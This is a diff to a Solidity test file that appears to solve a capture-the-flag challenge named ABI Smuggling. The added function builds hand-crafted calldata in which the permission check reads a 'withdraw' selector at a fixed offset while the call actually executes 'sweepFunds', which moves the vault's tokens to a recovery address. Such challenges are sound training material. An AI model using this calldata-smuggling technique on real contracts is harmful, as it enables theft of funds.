@@ -72,7 +72,35 @@ contract ABISmugglingChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_abiSmuggling() public checkSolvedByPlayer {}
+    function test_abiSmuggling() public checkSolvedByPlayer {
+        /*
+        Data:
+            1. execute selector - to call 'execute' from AuthorizedExecutor.sol
+            2. vault - 'target' to call in 'execute'
+            3. offset - skip vault, offset, empty slot and withdraw selector
+            4. empty slot - can be anything, but we need it for calldataOffset in 'execute'
+            5. withdraw selector - has to be in this slot to 'permissions' return 'true'
+            6. next data length - the length of 'sweepFunds' call: selector + 2 addresses
+            7. sweepFunds selector - to call 'sweepFunds' from SelfAuthorizedVault.sol
+            8. recovery
+            9. token
+        */
+
+        bytes memory data = bytes.concat(
+            vault.execute.selector,
+            abi.encode(address(vault)),
+            bytes32(uint256(32 * 3 + 4)),
+            bytes32(uint256(69)),
+            vault.withdraw.selector,
+            bytes32(uint256(32 * 2 + 4)),
+            vault.sweepFunds.selector,
+            abi.encode(recovery),
+            abi.encode(address(token))
+        );
+
+        (bool s,) = address(vault).call(data);
+        require(s);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
